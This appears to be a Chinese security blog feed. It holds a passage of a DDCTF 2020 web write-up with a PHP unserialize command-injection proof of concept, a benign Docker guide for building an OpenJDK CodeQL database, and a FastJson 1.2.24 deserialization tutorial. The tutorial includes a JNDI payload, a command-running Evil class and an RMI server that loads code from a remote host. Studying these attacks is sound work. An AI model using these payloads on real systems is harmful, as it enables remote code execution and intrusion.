<p>反弹Shell后发现权限很低</p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908162950387.png" alt="image-20200908162950387"></p>
<p>就拖份源码吧</p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908163055003.png" alt="image-20200908163055003"></p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908163122104.png" alt="image-20200908163122104"></p>
<h2 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$kw0ng</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;kw0ng = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;find /HackersForever &#x27;</span> . <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HintClass</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="variable">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t Do That!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowOff</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;/hint/hint.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contents = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contents</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page-&gt;contents = <span class="string">&quot;POP me! I can give you some hints!&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiddleMan</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cont</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">ShowOff</span>();</span><br><span class="line"><span class="variable">$bullet</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bullet&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$bullet</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Give Me Something!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$bullet</span> == <span class="string">&#x27;phpinfo&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$infos</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$obstacle1</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    <span class="variable">$obstacle2</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    <span class="variable">$mc</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">    <span class="variable">$mc</span>-&gt;flag = <span class="string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$bullet</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$mc</span>-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>/hint/hint.php</code>得到提示和一半flag</p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905185300895.png" alt="image-20200905185300895"></p>
<p>以关键字google到参考文章<a href="https://hackerone.com/reports/198734">https://hackerone.com/reports/198734</a></p>
<p>覆盖<code>$mc</code>对象的<code>flag</code>属性，命令注入，题目中的$mc在本地搭建环境打印出来后为object#4，尝试了很久很久才发现文章中的poc里的<code>s:1:&quot;1&quot;</code>要改成<code>s:1:&quot;4&quot;</code>，其中的4决定了GMP覆盖的对象是哪个object，DateInterval为php5.6-5.6.11可利用的内置类，POC如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$inner</span> = <span class="string">&#x27;s:1:&quot;4&quot;;a:3:&#123;s:5:&quot;kw0ng&quot;;R:2;s:4:&quot;flag&quot;;s:43:&quot;-exec cat /HackersForever/suffix_flag.php ;&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$exploit</span> = <span class="string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$inner</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$inner</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$exploit</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905230759614.png" alt="image-20200905230759614"></p>
<p>后来看其他师傅的WP发现不用GMP，也可以直接构造POP链获取flag，参考<a href="https://www.anquanke.com/post/id/216694">https://www.anquanke.com/post/id/216694</a></p>
<p>（一直不知道在<code>$v</code>可控的情况下，可以传入元素为一个对象和函数名的数组，这样<code>$v()</code>就能调用这个对象的方法）</p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200910220826959.png" alt="image-20200910220826959"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker编译OpenJDK CodeQL数据库</title>
    <url>/2023/09/06/Docker%E7%BC%96%E8%AF%91OpenJDK-CodeQL%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p>通过Docker编译OpenJDK源码，并生成CodeQL数据库。之前编译过JDK，不过没留存环境，重复手动构建编译环境有点麻烦，这次顺便记录一下编译过程及Dockerfile</p>
<span id="more"></span>

<p>编译方法参考<a href="https://openjdk.org/groups/build/doc/building.html">OpenJDK官方文档</a>，构建 JDK 需要预先存在的 JDK ，即 boot JDK，一般 boot JDK 的主版本需要低于编译版本。boot JDK 可在<a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">oracle</a>下载，JDK 源码在 <a href="https://github.com/openjdk/jdk8u/tags">OpenJDK 的代码仓库</a>下载。另外还需要下载Linux版本的<a href="https://github.com/github/codeql-cli-binaries/releases">CodeQL CLI</a></p>
<p>最后目录结构如下：</p>
<p><img src="/2023/09/06/Docker%E7%BC%96%E8%AF%91OpenJDK-CodeQL%E6%95%B0%E6%8D%AE%E5%BA%93/image-20230908132515211.png" alt="image-20230908132515211"></p>
<p>bootJDK，codeqlCLI，source 目录下均放对应资源的已解压的文件夹</p>
<p>Dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> --platform=linux/amd64 centos:centos7</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum groupinstall <span class="string">&quot;Development Tools&quot;</span> -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    yum install <span class="built_in">which</span> -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    yum install libXtst-devel libXt-devel libXrender-devel libXrandr-devel libXi-devel -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    yum install cups-devel -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    yum install freetype-devel -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    yum install alsa-lib-devel -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    yum install fontconfig-devel -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    yum install libffi-devel -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    yum install autoconf -y</span></span><br></pre></td></tr></table></figure>

<p>docker-compose.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">jdk_compiler:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">jdk_compiler</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./bootJDK:/root/bootJDK</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./source:/root/source</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./codeqlCLI:/root/codeqlCLI</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./database:/root/database</span></span><br><span class="line">    <span class="attr">command:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">/bin/bash</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        cd /root/source/*/</span></span><br><span class="line"><span class="string">        make dist-clean</span></span><br><span class="line"><span class="string">        bash configure --with-boot-jdk=`echo /root/bootJDK/*/`</span></span><br><span class="line"><span class="string">        export DISABLE_HOTSPOT_OS_VERSION_CHECK=ok</span></span><br><span class="line"><span class="string">        /root/codeqlCLI/*/codeql database create /root/database/`basename \`pwd\`` --language=&quot;java&quot; --command=&quot;make images&quot;</span></span><br></pre></td></tr></table></figure>



<p>cd到docker-compose.yml所在目录，执行<code>docker compose up</code>即可，编译时间可能会很长，几十分钟到一小时左右，编译好的数据在database目录下</p>
<p>我在ARM架构的Mac上运行该容器，总会在CodeQL编译数据库的时候卡住，不知道是否是因为架构问题，转译或者模拟运行太慢还是bug，后面换成AMD64的机器可以正常编译</p>
]]></content>
      <tags>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson 1.2.24 反序列化</title>
    <url>/2020/02/25/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>FastJson是一个Java语言编写的高性能功能完善的JSON库，可以将数据在JSON和Java Object之间互相转换，涉及到序列化和反序列化的操作，由此从1.2.24版本便开始爆出反序列化漏洞</p>
<span id="more"></span>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>创建Maven项目</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.20.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> &#123;</span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;l3yx&quot;</span>);</span><br><span class="line">        String user_json= JSON.toJSONString(user);</span><br><span class="line">        System.out.println(user_json);</span><br><span class="line"></span><br><span class="line">        Object user1=JSON.parse(user_json);</span><br><span class="line">        Object user2=JSON.parseObject(user_json,User.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(user1.getClass().getName());</span><br><span class="line">        System.out.println(user2.getClass().getName());</span><br><span class="line">        System.out.println(((User)user2).getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219194842317.png" alt="image-20200219194842317"></p>
<p>可以看到<code>parse(String)</code>将JSON字符串解析成了一个JSONObject对象，<code>parseObject(String,Class)</code>将JSON字符串反序列化为一个相应的Java对象</p>
<p>另外FastJson还提供一个特殊字符段<code>@type</code>，通过这个字段可以指定反序列化任意类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> &#123;</span><br><span class="line">        String user_json=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;name\&quot;:\&quot;l3yx\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(user_json);</span><br><span class="line"></span><br><span class="line">        Object user1=JSON.parse(user_json);</span><br><span class="line">        Object user2=JSON.parseObject(user_json,User.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(user1.getClass().getName());</span><br><span class="line">        System.out.println(user2.getClass().getName());</span><br><span class="line">        System.out.println(((User)user2).getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setter...&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219200001327.png" alt="image-20200219200001327"></p>
<p>而且在反序列化的同时调用了对象的set方法，说明FastJson在对JSON字符串反序列化的时候，会尝试通过setter方法对对象的属性进行赋值</p>
<p>那么在这种情况下，找到有可以利用的setter方法的类，就能完成该漏洞的利用</p>
<p>在满足一定条件下也会调用getter方法</p>
<blockquote>
<ul>
<li><p>方法名长度大于等于4 </p>
</li>
<li><p>非静态方法 </p>
</li>
<li><p>以get开头且第4个字母为大写 </p>
</li>
<li><p>无传入参数 </p>
</li>
<li><p>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</p>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String json=<span class="string">&quot;&#123;\&quot;table\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Foo foo=JSON.parseObject(json,Foo.class, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Hashtable table;</span><br><span class="line">    <span class="keyword">public</span> Hashtable <span class="title function_">getTable</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getter&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200223162243964.png" alt="image-20200223162243964"></p>
<p>具体的规则参考于 <a href="https://xz.aliyun.com/t/7027">JAVA反序列化—FastJson组件</a></p>
<h2 id="JdbcRowSetImpl-JNDI-Reference-Payload"><a href="#JdbcRowSetImpl-JNDI-Reference-Payload" class="headerlink" title="JdbcRowSetImpl+JNDI Reference Payload"></a>JdbcRowSetImpl+JNDI Reference Payload</h2><p>先看一下<code>JdbcRowSetImpl</code>的源码</p>
<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219204924165.png" alt="image-20200219204924165"></p>
<p>该类的<code>connect()</code>函数中325行和326行是一段JNDI查找远程对象的代码，如果<code>this.getDataSourceName()</code>可控并且能触发<code>connect()</code>函数的话就有可能实现JNDI注入达到RCE</p>
<p><code>setDataSourceName(String var1)</code>函数赋值<code>dataSourceName</code></p>
<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219205713857.png" alt="image-20200219205713857"></p>
<p><code>setAutoCommit(boolean var1)</code>函数调用了<code>connect()</code></p>
<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219210134852.png" alt="image-20200219210134852"></p>
<p>之前说到FastJson会自动调用setter来完成对对象属性的赋值，所以这里payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://ip:port/Evil&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>首先<code>@type</code>字段会指定反序列化<code>com.sun.rowset.JdbcRowSetImpl</code>类</p>
<p>然后调用<code>setDataSourceName(String var1)</code>对<code>dataSourceName</code>赋值，这里赋值为恶意的RMI服务地址</p>
<p>最后调用<code>setAutoCommit(boolean var1)</code>从而调用<code>connect()</code>触发JNDI注入,<code>autoCommit</code>的值类型是<code>boolean</code>，这里设置<code>true</code>或<code>false</code>都可，JNDI注入部分可以参考<a href="https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw">深入理解JNDI注入与Java反序列化漏洞利用</a></p>
<p>下面构造一个恶意类，其中执行命令的代码可以放在构造方法，<code>getObjectInstance()</code>方法或者静态代码块中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译好的class文件放于web服务器</p>
<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219213313663.png" alt="image-20200219213313663"></p>
<p>通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;ip&quot;</span>);<span class="comment">//ip为服务器外网地址</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">remote_class_server</span> <span class="operator">=</span> <span class="string">&quot;http://ip:80/&quot;</span>;<span class="comment">//恶意对象地址</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Evil&quot;</span>, <span class="string">&quot;Evil&quot;</span>, remote_class_server);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Evil&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;start...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200220132549408.png" alt="image-20200220132549408"></p>
<p>或者借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，直接启动一个RMI服务器，监听9999端口，并制定加载远程类<code>Evil.class</code></p>
<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://ip/#Evil&quot; 9999</code></p>
<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219213456771.png" alt="image-20200219213456771"></p>
<p>最后运行漏洞代码加载payload</p>
<p>在高版本中Java限制了Naming&#x2F;Directory服务中JNDI Reference远程加载Object Factory类的特性。默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将相关属性值设置为true</p>
